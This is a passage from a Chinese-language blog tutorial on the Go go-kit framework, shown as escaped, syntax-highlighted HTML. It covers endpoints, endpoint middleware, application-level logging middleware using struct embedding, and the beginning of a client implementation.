&lt;span class="kd">type&lt;/span> &lt;span class="nx">uppercaseRequest&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">S&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">`json:&amp;#34;s,omitempty&amp;#34;`&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">uppercaseResponse&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">S&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">`json:&amp;#34;s,omitempty&amp;#34;`&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">logger&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewLogfmtLogger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stderr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Handle&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/uppercase&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">httptransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServer&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="c1">// endpoint 定义
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">request&lt;/span> &lt;span class="kd">interface&lt;/span>&lt;span class="p">{})&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span> &lt;span class="kd">interface&lt;/span>&lt;span class="p">{},&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">req&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">request&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="nx">uppercaseRequest&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s">&amp;#34;&amp;#34;&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">uppercaseResponse&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">},&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">uppercaseResponse&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">strings&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ToUpper&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">)},&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="c1">// 请求 decoder
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">r&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Request&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{},&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">request&lt;/span> &lt;span class="nx">uppercaseRequest&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">json&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewDecoder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">r&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Body&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">Decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">request&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">request&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="c1">// 响应 encoder
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">w&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ResponseWriter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">response&lt;/span> &lt;span class="kd">interface&lt;/span>&lt;span class="p">{})&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">json&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewEncoder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">Encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">},&lt;/span>
&lt;span class="p">))&lt;/span>
&lt;span class="nx">logger&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;msg&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;HTTP&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;addr&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;:8080&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">logger&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;err&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">ListenAndServe&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;:8080&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">))&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Endpoint&lt;/code> 本质是一个函数，类型签名如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// Endpoint is the fundamental building block of servers and clients.
&lt;/span>&lt;span class="c1">// It represents a single RPC method.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">type&lt;/span> &lt;span class="nx">Endpoint&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">request&lt;/span> &lt;span class="kd">interface&lt;/span>&lt;span class="p">{})&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span> &lt;span class="kd">interface&lt;/span>&lt;span class="p">{},&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>Endpoint&lt;/code> 抽象了 RPC 调用，隐藏了调用对象是“本地”还是“远程”的。像是上面的案例里，&lt;code>Endpoint&lt;/code> 背后是本地的代码。而在客户端使用&lt;code>Endpoint&lt;/code>时，&lt;code>Endpoint&lt;/code>的背后往往是传输层代码，发起了一次远程调用。&lt;/p>
&lt;p>&lt;code>Endpoint&lt;/code> 本身不做请求/响应的编解码工作，进入 &lt;code>Endpoint&lt;/code> 的都是已经准备好的结构化数据。&lt;/p>
&lt;h3 id="endpointmiddleware-解析">endpoint.Middleware 解析&lt;/h3>
&lt;p>&lt;code>endpoint.Middleware&lt;/code> 是在 &lt;code>Endpoint&lt;/code> 上包装的中间件，签名如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// Middleware is a chainable behavior modifier for endpoints.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">type&lt;/span> &lt;span class="nx">Middleware&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">Endpoint&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">Endpoint&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>和 &lt;code>gin&lt;/code> 之类的框架中间件体系很相似，都是基于高阶函数的方式。一个简单的日志中间件实现如下。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;context&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/go-kit/kit/endpoint&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/go-kit/log&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">LoggingMiddleware&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">logger&lt;/span> &lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Logger&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">endpoint&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Middleware&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">next&lt;/span> &lt;span class="nx">endpoint&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Endpoint&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">endpoint&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Endpoint&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">request&lt;/span> &lt;span class="kd">interface&lt;/span>&lt;span class="p">{})&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kd">interface&lt;/span>&lt;span class="p">{},&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">logger&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;msg&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;calling endpoint&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nx">logger&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;msg&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;called endpoint&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nf">next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">request&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>像这样定义的中间件用法也很简单，以 &lt;code>Endpoint&lt;/code> 为参数调用即可。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="nf">LoggingMiddleware&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">With&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">logger&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;method-name&amp;#34;&lt;/span>&lt;span class="p">))(&lt;/span>&lt;span class="nx">endpoint&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>说起这个我就怀念 python 的装饰器。&lt;/p>
&lt;h3 id="应用中间件">应用中间件&lt;/h3>
&lt;p>应用中间件不算是 gokit 的一部分，gokit 的示例中给出了&lt;a class="link" href="http://gokit.io/examples/stringsvc.html#application-logging" target="_blank" rel="noopener"
>应用级中间件的做法&lt;/a>。实话说我不喜欢。&lt;/p>
&lt;p>所谓的应用中间件做法其实就是再定义一个结构，实现你的服务接口，然后在实现的服务接口里加上需要的中间件代码。&lt;/p>
&lt;p>如果要说有什么好处的话，就是满足了类型约束，免去了用 &lt;code>reflect&lt;/code>。&lt;code>Endpoint&lt;/code>一级的中间件只能拿到一个 &lt;code>request interface{}&lt;/code> ，但下面这样写的话，参数就是已经填好的了，服务实现里拿到什么参数这个中间件就拿到什么参数。但问题也很明显——为了满足 &lt;code>type Service interface&lt;/code> 的约束，这样的中间件必须把服务的所有接口都写个 stub 。就算是用编辑器的 &lt;code>generate interface stubs&lt;/code> 功能也没法直接帮你填好转发参数的代码啊&amp;hellip;&lt;/p>
&lt;p>我自己倒是折腾出一个有点怪的解法，利用 go 的 embed 字段和动态分发机制，部分实现了有继承的语言里的 override 。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;play/stringsvc1&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/go-kit/log&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">LoggingMiddleware&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">stringsvc1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StringService&lt;/span> &lt;span class="c1">// LoggingMiddleware 自己没有实现全部的 stringsvc1.StringService 接口，但这个 embed 字段实现了
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="nx">Logger&lt;/span> &lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Logger&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// 这个实现覆盖掉了结构里的 stringsvc1.StringService.Uppercase 暴露的实现
&lt;/span>&lt;span class="c1">// 然后内部又使用了 `.StringService.Uppercase` 这种语法来调用结构里的
&lt;/span>&lt;span class="c1">// stringsvc1.StringService.Uppercase 实现
&lt;/span>&lt;span class="c1">// 就像是有继承的语言里子类通过 super() 或者 ParentClass::Uppercase 这样的方式调用父类实现一样。
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">m&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">LoggingMiddleware&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Uppercase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Logger&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;msg&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;call endpoint&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;arg&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Logger&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;msg&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;called endpoint&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;arg&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">m&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">StringService&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Uppercase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过这种办法倒是实现了应用级的特定接口中间件。但还要另外定义一个 &lt;code>struct&lt;/code> 也比较麻烦。&lt;/p>
&lt;p>贴一下示例里的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// middleware.go
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">type&lt;/span> &lt;span class="nx">loggingMiddleware&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">logger&lt;/span> &lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Logger&lt;/span>
&lt;span class="nx">next&lt;/span> &lt;span class="nx">StringService&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">mw&lt;/span> &lt;span class="nx">loggingMiddleware&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Uppercase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">output&lt;/span> &lt;span class="kt">string&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="kd">func&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">begin&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Time&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">mw&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">logger&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Log&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;method&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;uppercase&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;input&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;output&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">output&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;err&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>&lt;span class="p">,&lt;/span>
&lt;span class="s">&amp;#34;took&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Since&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">begin&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="p">}(&lt;/span>&lt;span class="nx">time&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Now&lt;/span>&lt;span class="p">())&lt;/span>
&lt;span class="nx">output&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">mw&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">next&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Uppercase&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// main.go
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
&lt;span class="s">&amp;#34;os&amp;#34;&lt;/span>
&lt;span class="s">&amp;#34;github.com/go-kit/kit/log&amp;#34;&lt;/span>
&lt;span class="nx">httptransport&lt;/span> &lt;span class="s">&amp;#34;github.com/go-kit/kit/transport/http&amp;#34;&lt;/span>
&lt;span class="p">)&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">logger&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">log&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewLogfmtLogger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">os&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Stderr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="kd">var&lt;/span> &lt;span class="nx">svc&lt;/span> &lt;span class="nx">StringService&lt;/span>
&lt;span class="nx">svc&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">stringService&lt;/span>&lt;span class="p">{}&lt;/span>
&lt;span class="nx">svc&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">loggingMiddleware&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">logger&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">svc&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="nx">uppercaseHandler&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">httptransport&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewServer&lt;/span>&lt;span class="p">(&lt;/span>
&lt;span class="nf">makeUppercaseEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">svc&lt;/span>&lt;span class="p">),&lt;/span>
&lt;span class="c1">// ...
&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="p">)&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="客户端实现">客户端实现&lt;/h3>
&lt;p>客户端实现可以很简单，同样有很强的扩展性。比如说可以结合服务发现、负载均衡、频率限制、熔断器实现一个功能强大的客户端。&lt;/p>
&lt;p>先从简单的开始。一般考虑客户端实现的话，会准备一个特殊的结构来保存服务的 &lt;code>Endpoint&lt;/code>，再对这个结构实现服务定义的接口。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="c1">// https://github.com/go-kit/examples/blob/master/addsvc/pkg/addendpoint/set.go
&lt;/span>&lt;span class="c1">&lt;/span>
&lt;span class="c1">// Set collects all of the endpoints that compose an add service. It&amp;#39;s meant to
&lt;/span>&lt;span class="c1">// be used as a helper struct, to collect all of the endpoints into a single
&lt;/span>&lt;span class="c1">// parameter.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">type&lt;/span> &lt;span class="nx">Set&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">SumEndpoint&lt;/span> &lt;span class="nx">endpoint&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Endpoint&lt;/span>
&lt;span class="nx">ConcatEndpoint&lt;/span> &lt;span class="nx">endpoint&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Endpoint&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// Sum implements the service interface, so Set may be used as a service.
&lt;/span>&lt;span class="c1">// This is primarily useful in the context of a client library.
&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="nx">Set&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Sum&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Context&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">a&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">b&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kt">error&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">resp&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">SumEndpoint&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ctx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">SumRequest&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">a&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">B&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">b&lt;/span>&lt;span class="p">})&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="nx">response&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">resp&lt;/span>&lt;span class="p">.(&lt;/span>&lt;span class="nx">SumResponse&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="c1">// ... 略
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这么做的好处是可以像是调用 Go 方法一样去调用 RPC 函数，比起 &lt;code>grpc&lt;/code> 一类的调用方式来说更直观了。&lt;/p>
&lt;p>客户端的 &lt;code>Endpoint&lt;/code> 的构造方式和服务器不一样，隐藏在 &lt;code>Endpoint&lt;/code> 背后的不是本地代码，而是一个网络请求。&lt;/p>
